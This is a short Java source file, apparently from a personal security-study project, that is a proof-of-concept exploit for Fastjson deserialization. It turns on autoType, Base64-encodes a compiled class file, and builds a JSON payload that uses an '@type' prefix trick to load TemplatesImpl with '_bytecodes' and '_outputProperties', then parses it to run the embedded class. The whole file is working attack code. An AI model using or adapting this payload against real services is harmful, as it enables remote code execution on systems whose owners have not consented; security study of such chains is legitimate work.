package fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class exp1 {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        byte[] codes = Files.readAllBytes(Paths.get("D:\\java_project\\JavaSecurityStudy\\target\\classes\\ClassLoad\\TemplateCode.class"));
        String bytescode = Base64.getEncoder().encodeToString(codes);
        String payload = "{\n" +
                "    \"@type\": \"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\",\n" +
                "    \"_bytecodes\": [\""+bytescode+"\"],\n" +
                "    \"_name\": \"pysnow\",\n" +
                "    \"_tfactory\": {},\n" +
                "    \"_outputProperties\": {},\n" +
                "}";
        JSON.parseObject(payload, Object.class,new ParserConfig(), Feature.SupportNonPublicField);
    }
}
